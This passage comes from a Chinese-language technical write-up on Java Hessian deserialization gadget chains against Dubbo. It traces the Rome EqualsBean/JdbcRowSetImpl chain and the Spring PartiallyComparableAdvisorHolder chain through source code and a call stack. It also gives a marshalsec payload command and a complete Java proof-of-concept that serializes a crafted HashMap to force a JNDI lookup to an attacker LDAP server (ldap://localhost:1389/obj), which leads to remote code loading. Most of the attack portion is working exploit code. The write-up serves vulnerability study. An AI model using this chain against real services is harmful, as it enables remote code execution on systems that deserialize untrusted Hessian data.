    public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
这里获取到的key和value的值都为`EqualsBean`实例化对象。
该位置去调用hash方法去计算hashcode的值
    static final int hash(Object key) {
            int h;
            return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
        }
`com.rometools.rome.feed.impl.EqualsBean#hashcode`
     public int hashCode() {
            return this.beanHashCode();
        }
这里的hashcode是调用`beanHashCode`方法
     public int beanHashCode() {
            return this.obj.toString().hashCode();
        }
       public String toString() {
            Stack stack = (Stack)PREFIX_TL.get();
            boolean needStackCleanup = false;
            if (stack == null) {
                stack = new Stack();
                PREFIX_TL.set(stack);
                needStackCleanup = true;
            }
            String[] tsInfo;
            if (stack.isEmpty()) {
                tsInfo = null;
            } else {
                tsInfo = (String[])stack.peek();
            }
            String prefix;
            String result;
            if (tsInfo == null) {
                result = this.obj.getClass().getName();
                prefix = result.substring(result.lastIndexOf(".") + 1);
            } else {
                prefix = tsInfo[0];
                tsInfo[1] = prefix;
            }
            result = this.toString(prefix);
            if (needStackCleanup) {
                PREFIX_TL.remove();
            }
            return result;
        }
调用this.toString
    private String toString(String prefix) {
        StringBuffer sb = new StringBuffer(128);
        try {
            List propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);
            Iterator var10 = propertyDescriptors.iterator();
            while(var10.hasNext()) {
                PropertyDescriptor propertyDescriptor = (PropertyDescriptor)var10.next();
                String propertyName = propertyDescriptor.getName();
                Method getter = propertyDescriptor.getReadMethod();
                Object value = getter.invoke(this.obj, NO_PARAMS);
                this.printProperty(sb, prefix + "." + propertyName, value);
                ...
反射调用this.obj的`getDatabaseMetaData`方法
     public DatabaseMetaData getDatabaseMetaData() throws SQLException {
            Connection var1 = this.connect();
            return var1.getMetaData();
        }
      private Connection connect() throws SQLException {
            if (this.conn != null) {
                return this.conn;
            } else if (this.getDataSourceName() != null) {
                try {
                    InitialContext var1 = new InitialContext();
                    DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
触发lookup,后面自然不用多说了。
**调用栈**
    lookup:417, InitialContext (javax.naming)
    connect:624, JdbcRowSetImpl (com.sun.rowset)
    getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    toString:158, ToStringBean (com.rometools.rome.feed.impl)
    toString:129, ToStringBean (com.rometools.rome.feed.impl)
    beanHashCode:198, EqualsBean (com.rometools.rome.feed.impl)
    hashCode:180, EqualsBean (com.rometools.rome.feed.impl)
    hash:339, HashMap (java.util)
    put:612, HashMap (java.util)
    readMap:114, MapDeserializer (com.caucho.hessian.io)
    readMap:538, SerializerFactory (com.caucho.hessian.io)
    readObject:2110, Hessian2Input (com.caucho.hessian.io)
    readObject:86, Hessian2ObjectInput (org.apache.dubbo.serialize.hessian)
    main:57, remotest
###  SpringPartiallyComparableAdvisorHolder
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian SpringPartiallyComparableAdvisorHolder ldap://127.0.0.1:1388/Exp
该gadget需要以下依赖
        org.springframework
        spring-aop
        5.0.0.RELEASE
        org.springframework
        spring-context
        4.1.3.RELEASE
        org.aspectj
        aspectjweaver
        1.6.10
####  构造分析
    default Object makePartiallyComparableAdvisorHolder ( UtilFactory uf, String[] args ) throws Exception {
            String jndiUrl = args[ 0 ];
            BeanFactory bf = SpringUtil.makeJNDITrigger(jndiUrl);
            return SpringUtil.makeBeanFactoryTriggerPCAH(uf, jndiUrl, bf);
        }
跟踪`SpringUtil.makeJNDITrigger`方法
    public static BeanFactory makeJNDITrigger ( String jndiUrl ) throws Exception {
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
        return bf;
    }
    public void setShareableResources(String... shareableResources) {
        this.shareableResources.addAll(Arrays.asList(shareableResources));
    }
该方法将jndiurl转换成一个list对象，然后传递调用`this.shareableResources.addAll()`方法，该方法对
`shareableResources`的`HashSet`进行addAll的操作
继续来到下面
设置logger的值为NoOpLog实例化对象，获取`bf.getJndiTemplate()`也进行同样操作。
接着返回bf的`BeanFactory`实例化对象
    public static Object makeBeanFactoryTriggerPCAH ( UtilFactory uf, String name, BeanFactory bf ) throws ClassNotFoundException,
            NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
        Reflections.setFieldValue(aif, "beanFactory", bf);
        Reflections.setFieldValue(aif, "name", name);
        AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
        Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
        // make readObject happy if it is called
        Reflections.setFieldValue(advice, "declaringClass", Object.class);
        Reflections.setFieldValue(advice, "methodName", "toString");
        Reflections.setFieldValue(advice, "parameterTypes", new Class[0]);
        AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
        Reflections.setFieldValue(advisor, "advice", advice);
        Class pcahCl = Class
                .forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
        Object pcah = Reflections.createWithoutConstructor(pcahCl);
        Reflections.setFieldValue(pcah, "advisor", advisor);
        return uf.makeToStringTriggerUnstable(pcah);
    }
创建`BeanFactoryAspectInstanceFactory`的实例化对象，名为aif，并将bf变量和name分别反射赋值到beanFactory和name中。bf为上面获取的`BeanFactory`对象。
接着创建`AbstractAspectJAdvice`对象，将`aspectInstanceFactory`的值，设置为aif变量对象进行传递。
将advice的`declaringClass`、`methodName`、`parameterTypes`分别设置为`Object.class`、`toString`、`new
Class[0]`,创建`AspectJPointcutAdvisor`对象，将前面设置了一系列值的`advice`放置到`advisor`对象的`advice`变量中。
最后创建`org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder`对象，将`advisor`设置到该对象的`advisor`成员变量中。并且调用`uf.makeToStringTriggerUnstable(pcah);`
跟踪该方法
    public static Object makeToStringTrigger ( Object o, Function wrap ) throws Exception {
        String unhash = unhash(o.hashCode());
        XString xString = new XString(unhash);
        return JDKUtil.makeMap(wrap.apply(o), wrap.apply(xString));
    }
      public static HashMap makeMap ( Object v1, Object v2 ) throws Exception {
            HashMap s = new HashMap<>();
            Reflections.setFieldValue(s, "size", 2);
            Class nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            }
            catch ( ClassNotFoundException e ) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);
            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
            Reflections.setFieldValue(s, "table", tbl);
            return s;
        }
与前面的一致，再次就不做分析了
**利用分析**
**poc**
    import com.caucho.hessian.io.Hessian2Input;
    import com.caucho.hessian.io.Hessian2Output;
    import com.sun.org.apache.xpath.internal.objects.XString;
    import marshalsec.HessianBase;
    import marshalsec.util.Reflections;
    import org.apache.commons.logging.impl.NoOpLog;
    import org.apache.dubbo.serialize.hessian.Hessian2ObjectInput;
    import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;
    import org.springframework.aop.aspectj.AbstractAspectJAdvice;
    import org.springframework.aop.aspectj.AspectInstanceFactory;
    import org.springframework.aop.aspectj.AspectJAroundAdvice;
    import org.springframework.aop.aspectj.AspectJPointcutAdvisor;
    import org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;
    import org.springframework.aop.target.HotSwappableTargetSource;
    import org.springframework.jndi.support.SimpleJndiBeanFactory;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.lang.reflect.Array;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationTargetException;
    import java.util.HashMap;
    public class SpringPartiallyComparableAdvisorHoldertest {
        public static void main(String[] args) throws Exception {
            String jndiUrl = "ldap://localhost:1389/obj";
            SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
            bf.setShareableResources(jndiUrl);
    //反序列化时BeanFactoryAspectInstanceFactory.getOrder会被调用，会触发调用SimpleJndiBeanFactory.getType->SimpleJndiBeanFactory.doGetType->SimpleJndiBeanFactory.doGetSingleton->SimpleJndiBeanFactory.lookup->JndiTemplate.lookup
            Reflections.setFieldValue(bf, "logger", new NoOpLog());
            Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new NoOpLog());
    //反序列化时AspectJAroundAdvice.getOrder会被调用，会触发BeanFactoryAspectInstanceFactory.getOrder
            AspectInstanceFactory aif = Reflections.createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);
            Reflections.setFieldValue(aif, "beanFactory", bf);
            Reflections.setFieldValue(aif, "name", jndiUrl);
    //反序列化时AspectJPointcutAdvisor.getOrder会被调用，会触发AspectJAroundAdvice.getOrder
            AbstractAspectJAdvice advice = Reflections.createWithoutConstructor(AspectJAroundAdvice.class);
            Reflections.setFieldValue(advice, "aspectInstanceFactory", aif);
    //反序列化时PartiallyComparableAdvisorHolder.toString会被调用，会触发AspectJPointcutAdvisor.getOrder
            AspectJPointcutAdvisor advisor = Reflections.createWithoutConstructor(AspectJPointcutAdvisor.class);
            Reflections.setFieldValue(advisor, "advice", advice);
    //反序列化时Xstring.equals会被调用，会触发PartiallyComparableAdvisorHolder.toString
            Class pcahCl = Class.forName("org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder");
            Object pcah = Reflections.createWithoutConstructor(pcahCl);
            Reflections.setFieldValue(pcah, "advisor", advisor);
    //反序列化时HotSwappableTargetSource.equals会被调用，触发Xstring.equals
            HotSwappableTargetSource v1 = new HotSwappableTargetSource(pcah);
            HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("xxx"));
            HashMap s = new HashMap<>();
            Reflections.setFieldValue(s, "size", 2);
            Class nodeC;
            try {
                nodeC = Class.forName("java.util.HashMap$Node");
            }
            catch ( ClassNotFoundException e ) {
                nodeC = Class.forName("java.util.HashMap$Entry");
            }
            Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
            nodeCons.setAccessible(true);
            Object tbl = Array.newInstance(nodeC, 2);
            Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
            Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
            Reflections.setFieldValue(s, "table", tbl);
    //反序列化时HashMap.putVal会被调用，触发HotSwappableTargetSource.equals。这里没有直接使用HashMap.put设置值，直接put会在本地触发利用链，所以使用marshalsec使用了比较特殊的处理方式。
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            Hessian2Output hessian2Output = new Hessian2Output(byteArrayOutputStream);
            HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();
            sf.setAllowNonSerializable(true);
            hessian2Output.setSerializerFactory(sf);
            hessian2Output.writeObject(s);
            hessian2Output.flushBuffer();
            byte[] bytes = byteArrayOutputStream.toByteArray();
            // hessian2反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
            Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
            HashMap o = (HashMap) hessian2Input.readObject();
        }
    }
以上代码
在序列化部分多出来了几行代码。我们知道，一般对于对象的序列化，如果对象对应的class没有对`java.io.Serializable`进行实现implement的话，是没办法序列化的，所以这里对输出流进行了设置，使其可以输出没有实现java.io.Serializable接口的对象。
将断点打到`com.caucho.hessian.io.MapDeserializer#readMap`
    public Object readMap(AbstractHessianInput in) throws IOException {
       ...
        while(!in.isEnd()) {
            ((Map)map).put(in.readObject(), in.readObject());
        }
        in.readEnd();
        return map;
    }
调用HashMap的put方法
    public V put(K key, V value) {
            return putVal(hash(key), key, value, false, true);
        }
与前面不同的是这里是借助putVal方法
     final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                       boolean evict) {
            Node[] tab; Node p; int n, i;
            if ((tab = table) == null || (n = tab.length) == 0)
                n = (tab = resize()).length;
            if ((p = tab[i = (n - 1) & hash]) == null)
                tab[i] = newNode(hash, key, value, null);
            else {
                Node e; K k;
                if (p.hash == hash &&
                    ((k = p.key) == key || (key != null && key.equals(k))))
key.equals方法位置进行跟踪
    public boolean equals(Object other) {
        return this == other || other instanceof HotSwappableTargetSource && this.target.equals(((HotSwappableTargetSource)other).target);
    }
    public boolean equals(Object obj2)
    {
      if (null == obj2)
        return false;
        // In order to handle the 'all' semantics of
        // nodeset comparisons, we always call the
        // nodeset function.
      else if (obj2 instanceof XNodeSet)
        return obj2.equals(this);
      else if(obj2 instanceof XNumber)
          return obj2.equals(this);
      else
        return str().equals(obj2.toString());
    }
调用obj2的toString
      public boolean equals(Object obj2)
      {
        if (null == obj2)
          return false;
          // In order to handle the 'all' semantics of
          // nodeset comparisons, we always call the
          // nodeset function.